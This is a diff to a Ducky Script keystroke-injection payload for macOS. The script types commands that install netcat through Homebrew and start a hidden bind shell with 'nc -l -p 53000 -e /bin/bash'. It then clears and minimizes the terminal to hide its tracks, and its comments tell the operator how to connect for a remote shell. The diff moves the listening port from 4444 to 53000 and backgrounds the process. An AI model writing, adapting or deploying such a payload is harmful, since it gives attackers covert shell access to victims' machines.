@@ -1,5 +1,5 @@
 REM installs netcat using home-brew (can adjust delay) 
-REM Runs the command nohup nc -l -p 4444 -vvv -e /bin/bash to start a netcat listener on port 4444 
+REM Runs the command nohup nc -l -p 4444 -vvv -e /bin/bash to start a netcat listener on port 53000 
 REM clears the terminal
 REM Gui m minimizes the terminal window
 
@@ -10,15 +10,15 @@ REM replacing '<remote-ip>' with the IP address of the target computer.
 REM I've noticed that NC does not respond if you copy and paste so please type the I.P. out!
 REM If the connection is successful, you should now have a remote shell session on the remote computer.
 
-REM To kill the listening port (4444 in this case)
+REM To kill the listening port (53000 in this case)
 REM you can use the kill command followed by the process ID (PID#)
-REM to find the PID use command ' ps -ef | grep "nc -lvp 4444" '
+REM to find the PID use command ' ps -ef | grep "nc -lvp 53000" '
 REM Once you have the PID # run the command 'kill <PID#>'
 
 
 REM to check if the port is closed 
-REM on the target computer run the command 'netstat -tuln | grep 4444'
-REM If the listening port is closed, there should be no output or listing for port 4444.
+REM on the target computer run the command 'netstat -tuln | grep 53000'
+REM If the listening port is closed, there should be no output or listing for port 53000.
 
 
 REM Requirements: install netcat on both the remote target and your computer 'brew install netcat'
@@ -42,7 +42,7 @@ DELAY 1000
 STRING brew install netcat
 ENTER
 DELAY 10000
-STRING nohup nc -l -p 4444 -vvv -e /bin/bash
+STRING nohup nc -l -p 53000 -vvv -e /bin/bash &
 ENTER
 DELAY 3500
 STRING clear
